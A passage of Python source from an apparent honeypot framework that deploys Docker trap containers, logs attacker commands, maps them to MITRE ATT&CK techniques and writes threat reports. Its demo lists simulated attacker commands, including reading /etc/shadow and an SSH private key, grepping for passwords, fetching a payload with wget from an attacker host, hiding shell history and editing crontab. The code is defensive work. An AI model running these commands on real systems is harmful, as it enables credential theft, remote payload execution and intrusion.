        start = datetime.fromisoformat(self.start_time)
        end   = datetime.fromisoformat(self.end_time) if self.end_time else datetime.now(timezone.utc)
        # Make start offset-aware if naive
        if start.tzinfo is None:
            start = start.replace(tzinfo=timezone.utc)
        if end.tzinfo is None:
            end = end.replace(tzinfo=timezone.utc)
        return int((end - start).total_seconds())


# ---------------------------------------------------------------------------
# 7. TrapController — main orchestrator
# ---------------------------------------------------------------------------

class TrapController:
    """
    Public API used by the Auto-SOC (api/main.py) to manage trap lifecycle.

    Typical flow:
        session = controller.deploy_trap(attacker_ip='185.x.x.x',
                                          anomaly_score=0.87,
                                          institution_type='hospital')
        # ... attacker commands arrive via controller.log_command() ...
        controller.teardown_trap(session.session_id)
    """

    def __init__(self) -> None:
        self.spawner   = DockerTrapSpawner()
        self.injector  = SyntheticDataInjector()
        self.kafka     = KafkaTelemetryStream()
        self.reporter  = ThreatIntelReporter()
        self._sessions: Dict[str, TrapSession] = {}

    # ------------------------------------------------------------------ #
    #  deploy_trap                                                         #
    # ------------------------------------------------------------------ #

    def deploy_trap(
        self,
        attacker_ip:      str,
        anomaly_score:    float = 1.0,
        institution_type: str   = "hospital",
    ) -> TrapSession:
        """
        Full trap deployment pipeline:
          1. Spawn isolated Docker container
          2. Inject synthetic data
          3. Emit session-start event to Kafka
          4. Return TrapSession handle
        """
        session_id = f"TRAP-{uuid.uuid4().hex[:12].upper()}"
        log.info(
            "Deploying trap | session=%s | attacker=%s | score=%.2f | type=%s",
            session_id, attacker_ip, anomaly_score, institution_type,
        )

        trap = self.spawner.spawn(attacker_ip, institution_type)
        self.injector.inject(self.spawner, trap)

        session = TrapSession(
            session_id=session_id,
            attacker_ip=attacker_ip,
            institution_type=institution_type,
            anomaly_score=anomaly_score,
            trap=trap,
        )
        self._sessions[session_id] = session

        # Emit session-start event
        start_event = TrapEvent(
            session_id=session_id,
            attacker_ip=attacker_ip,
            institution=institution_type,
            event_type="session_start",
            command="<SESSION STARTED>",
            anomaly_score=anomaly_score,
            container_id=trap.container_id,
            severity=self._score_to_severity(anomaly_score),
        )
        self.kafka.emit(start_event)

        # Schedule auto-teardown
        threading.Timer(
            TRAP_TIMEOUT_SECONDS,
            self.teardown_trap,
            args=(session_id,),
        ).start()

        log.info("Trap deployed: session=%s container=%s port=%d",
                 session_id, trap.container_id[:12], trap.host_port)
        return session

    # ------------------------------------------------------------------ #
    #  log_command                                                         #
    # ------------------------------------------------------------------ #

    def log_command(
        self,
        session_id:    str,
        command:       str,
        response:      str = "",
        anomaly_score: float = 0.5,
    ) -> TrapEvent:
        """
        Record an attacker command, map it to MITRE ATT&CK TTPs,
        and stream the event to Kafka.
        """
        from honeypot.server import extract_ttps   # reuse Module 4's TTP mapper
        ttps = extract_ttps(command)

        session = self._sessions.get(session_id)
        if not session:
            raise KeyError(f"Unknown session_id: {session_id}")

        event = TrapEvent(
            session_id=session_id,
            attacker_ip=session.attacker_ip,
            institution=session.institution_type,
            event_type="command",
            command=command[:512],
            response=response[:1024],
            ttps=ttps,
            anomaly_score=anomaly_score,
            container_id=session.trap.container_id if session.trap else "mock",
            severity=self._score_to_severity(anomaly_score),
        )
        session.events.append(event)
        self.kafka.emit(event)
        return event

    # ------------------------------------------------------------------ #
    #  teardown_trap                                                       #
    # ------------------------------------------------------------------ #

    def teardown_trap(self, session_id: str) -> Optional[dict]:
        """
        End the trap session:
          1. Emit session-end event to Kafka
          2. Stop and remove the Docker container
          3. Generate and save the threat intel report
          4. Return the report dict
        """
        session = self._sessions.pop(session_id, None)
        if not session:
            log.warning("teardown_trap called for unknown session: %s", session_id)
            return None

        session.end_time = datetime.now(timezone.utc).isoformat()

        end_event = TrapEvent(
            session_id=session_id,
            attacker_ip=session.attacker_ip,
            institution=session.institution_type,
            event_type="session_end",
            command="<SESSION ENDED>",
            anomaly_score=session.anomaly_score,
            container_id=session.trap.container_id if session.trap else "mock",
            severity=self._score_to_severity(session.anomaly_score),
        )
        self.kafka.emit(end_event)
        self.kafka.flush()

        if session.trap:
            self.spawner.teardown(session.trap.container_id)

        report = self.reporter.generate(session)
        log.info(
            "Trap session closed: %s | commands=%d | TTPs=%d | duration=%ds",
            session_id,
            len(session.events),
            sum(len(ev.ttps) for ev in session.events),
            session.duration_seconds,
        )
        return report

    # ------------------------------------------------------------------ #
    #  helpers                                                             #
    # ------------------------------------------------------------------ #

    @staticmethod
    def _score_to_severity(score: float) -> str:
        if score >= 0.85:
            return "critical"
        elif score >= 0.65:
            return "high"
        elif score >= 0.40:
            return "medium"
        return "low"

    @property
    def active_sessions(self) -> List[TrapSession]:
        return list(self._sessions.values())


# ---------------------------------------------------------------------------
# Async shell helper — calls the Honeypot Shell API (Module 4)
# ---------------------------------------------------------------------------

async def _call_honeypot_api(command: str, session_context: str = "") -> str:
    """Ask the Honeypot Shell API (Module 4) to generate a realistic response."""
    if not HTTPX_AVAILABLE:
        return _static_fallback(command)
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            resp = await client.post(
                HONEYPOT_SHELL_API,
                json={"command": command, "session_context": session_context},
            )
            resp.raise_for_status()
            return resp.json().get("output", "")
    except Exception as exc:
        log.debug("Honeypot API unavailable (%s) — using static fallback", exc)
        return _static_fallback(command)


def _static_fallback(command: str) -> str:
    """Minimal static responses for demo mode when Ollama is unavailable."""
    cmd = command.strip().split()[0] if command.strip() else ""
    responses = {
        "whoami":   "root",
        "id":       "uid=0(root) gid=0(root) groups=0(root)",
        "hostname": "aiims-backup-01",
        "uname":    "Linux aiims-backup-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
        "ls":       "bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var",
        "pwd":      "/root",
        "ps":       (
            "  PID TTY          TIME CMD\n"
            "    1 ?        00:00:02 systemd\n"
            "  342 ?        00:00:00 sshd\n"
            "  987 ?        00:05:11 mysqld\n"
            " 1234 pts/0    00:00:00 bash\n"
            " 1235 pts/0    00:00:00 ps"
        ),
        "env": (
            "USER=root\nHOME=/root\nSHELL=/bin/bash\n"
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
            "LOGNAME=root\nTERM=xterm-256color"
        ),
    }
    return responses.get(cmd, f"bash: {cmd}: command not found")


# ---------------------------------------------------------------------------
# Demo / smoke-test
# ---------------------------------------------------------------------------

def run_demo() -> None:
    """
    Simulates a complete attacker session end-to-end without requiring
    Docker, Kafka, or the Honeypot API to be running.
    """
    print("\n" + "=" * 70)
    print("  PROJECT CHAKRAVYUH — Module 3: Trap Controller Demo")
    print("=" * 70 + "\n")

    controller = TrapController()

    # Simulate ML Detector firing with a high anomaly score
    ATTACKER_IP    = "185.220.101.47"
    ANOMALY_SCORE  = 0.91
    INSTITUTION    = "hospital"

    print(f"[1/5] ML Detector Alert: {ATTACKER_IP} | score={ANOMALY_SCORE} | type={INSTITUTION}")
    session = controller.deploy_trap(
        attacker_ip=ATTACKER_IP,
        anomaly_score=ANOMALY_SCORE,
        institution_type=INSTITUTION,
    )
    print(f"      ✓ Trap deployed | session={session.session_id}")
    print(f"      ✓ Container: {session.trap.container_id[:16]} | port={session.trap.host_port}")

    # Simulate attacker commands observed in the session
    attacker_commands = [
        ("whoami",                     0.91),
        ("id",                         0.91),
        ("uname -a",                   0.88),
        ("cat /etc/passwd",            0.94),
        ("cat /etc/shadow",            0.97),
        ("ls /var/backups",            0.85),
        ("find / -name '*.sql*' 2>/dev/null", 0.92),
        ("cat /opt/his/config.xml",    0.95),
        ("grep -r password /etc/",     0.96),
        ("wget http://185.x.x.x/payload.sh", 0.99),
        ("chmod +x payload.sh",        0.98),
        ("crontab -e",                 0.97),
        ("HISTFILE=/dev/null",         0.99),
        ("cat /home/his_admin/.ssh/id_rsa", 0.99),
        ("ssh his_admin@10.10.0.1",    0.99),
    ]

    print(f"\n[2/5] Simulating {len(attacker_commands)} attacker commands...\n")
    for cmd, score in attacker_commands:
        response = asyncio.run(_call_honeypot_api(cmd))
        event = controller.log_command(
            session_id=session.session_id,
            command=cmd,
            response=response,
            anomaly_score=score,
        )
        ttp_ids = [t["id"] for t in event.ttps]
        print(f"  $ {cmd:<45}  TTPs: {ttp_ids if ttp_ids else '—'}")
        time.sleep(0.05)

    print(f"\n[3/5] Tearing down trap and generating report...")
    report = controller.teardown_trap(session.session_id)

    print(f"\n[4/5] Threat Intel Report: {report['report_id']}")
    print(f"      Duration       : {report['session']['duration_s']}s")
    print(f"      Total commands : {report['session']['total_commands']}")
    print(f"      Max severity   : {report['session']['max_severity'].upper()}")
    print(f"      Tactics seen   : {', '.join(report['mitre_attack']['tactic_coverage'])}")
    print(f"      TTPs observed  : {len(report['mitre_attack']['ttps_observed'])}")

    if report.get("iocs", {}).get("outbound_urls"):
        print(f"      Outbound URLs  : {report['iocs']['outbound_urls']}")

    print(f"\n      → {report['recommendation']}")

    print(f"\n[5/5] Report saved to: trap_reports/report_{report['report_id']}.json")
    print("\n" + "=" * 70)
    print("  Demo complete. All modules functional.")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Chakravyuh Module 3 — Generative Trap Controller"
    )
    parser.add_argument(
        "--demo",
        action="store_true",
        default=True,
        help="Run the full attacker session simulation (default: True)",
    )
    parser.add_argument(
        "--institution",
        choices=list(INSTITUTION_PROFILES.keys()),
        default="hospital",
        help="Institution type to simulate",
    )
    args = parser.parse_args()

    if args.demo:
        run_demo()